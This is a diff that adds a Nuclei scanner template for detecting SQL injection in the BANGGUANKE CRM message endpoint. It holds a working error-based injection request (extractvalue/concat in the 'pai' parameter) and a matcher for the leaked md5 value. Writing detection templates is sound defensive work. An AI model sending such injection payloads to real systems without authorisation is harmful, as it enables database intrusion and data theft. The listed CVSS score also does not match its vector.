@@ -1,0 +1,32 @@
+id: bangguanke-crm-sqli
+info:
+  name: BANGGUANKE CRM Message SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    SQL injection vulnerability exists in the CRM customer management system `/index.php/message` endpoint, which may allow attackers to extract sensitive database information.
+  reference:
+    - https://www.bgkcrm.com
+  classification:
+    cve-id: []
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 8.2
+  tags: sqli
+variables:
+  payload_md5_check: "md5(11)"
+http:
+  - raw:
+      - |
+        GET /index.php/message?page=1&pai=1%20and%20extractvalue(0x7e,concat(0x7e,({{payload_md5_check}}),0x7e))%23&xu=desc HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Nuclei-Scanner
+        Accept: */*
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "6512bd43d9caa6e02c990b0a82652dc"
+        part: body
